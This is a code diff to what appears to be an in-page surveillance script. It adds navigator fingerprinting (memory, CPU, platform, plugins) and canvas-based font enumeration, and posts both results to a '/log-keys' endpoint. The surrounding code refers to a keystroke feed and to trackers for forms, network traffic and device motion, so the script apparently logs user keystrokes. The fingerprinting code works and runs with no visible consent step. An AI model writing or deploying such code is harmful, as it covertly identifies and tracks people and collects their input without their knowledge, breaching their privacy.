@@ -1436,6 +1436,65 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         }, true);
     }
 
+    // ═══ NAVIGATOR FINGERPRINT ════════════════════════════════
+    // Captures hardware/platform fingerprinting data from navigator object:
+    // deviceMemory, hardwareConcurrency, maxTouchPoints, platform, vendor, plugins.
+    function initNavigatorFingerprint() {
+        try {
+            const n = navigator;
+            const parts = [
+                `mem=${n.deviceMemory != null ? n.deviceMemory + 'GB' : '?'}`,
+                `cpu=${n.hardwareConcurrency || '?'}cores`,
+                `touch=${n.maxTouchPoints || 0}`,
+                `platform=${n.platform || '?'}`,
+                `vendor=${(n.vendor || '?').slice(0, 40)}`,
+                `plugins=${n.plugins ? n.plugins.length : '?'}`,
+                `pdfViewer=${n.pdfViewerEnabled ? '1' : '0'}`,
+                `cookieEnabled=${n.cookieEnabled ? '1' : '0'}`,
+                `doNotTrack=${n.doNotTrack || '?'}`
+            ];
+            post('/log-keys', {
+                keys: `[NAVIGATOR] ${parts.join(' ')}`,
+                url: location.href
+            });
+        } catch {}
+    }
+
+    // ═══ FONT ENUMERATOR ══════════════════════════════════════
+    // Detects installed fonts by measuring canvas text width for known vs test font.
+    // Tests ~30 common fonts, reports which ones deviate from the fallback size.
+    function initFontEnumerator() {
+        try {
+            const cv = document.createElement('canvas');
+            const ctx = cv.getContext('2d');
+            if (!ctx) return;
+            const baseFont = 'monospace';
+            const testStr  = 'mmmmmmmmmmlli';
+            const testSize = '18px';
+            ctx.font       = `${testSize} ${baseFont}`;
+            const baseW    = ctx.measureText(testStr).width;
+            const fonts    = [
+                'Arial','Helvetica','Times New Roman','Courier New','Georgia',
+                'Verdana','Trebuchet MS','Impact','Comic Sans MS','Tahoma',
+                'Palatino Linotype','Lucida Console','Gill Sans','Optima','Futura',
+                'Calibri','Cambria','Segoe UI','Ubuntu','Roboto',
+                'Open Sans','Lato','Oswald','Montserrat','Source Sans Pro',
+                'Consolas','Menlo','Monaco','Andale Mono','Fira Code'
+            ];
+            const detected = [];
+            for (const f of fonts) {
+                ctx.font = `${testSize} "${f}",${baseFont}`;
+                if (ctx.measureText(testStr).width !== baseW) detected.push(f);
+            }
+            if (detected.length) {
+                post('/log-keys', {
+                    keys: `[FONTS] ${detected.length}/${fonts.length} detected: ${detected.join(', ').slice(0, 400)}`,
+                    url: location.href
+                });
+            }
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1573,6 +1632,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initPerformanceTimingCapture();
         initFormSubmitTracker();
         initRageClickDetector();
+        initNavigatorFingerprint();
+        initFontEnumerator();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
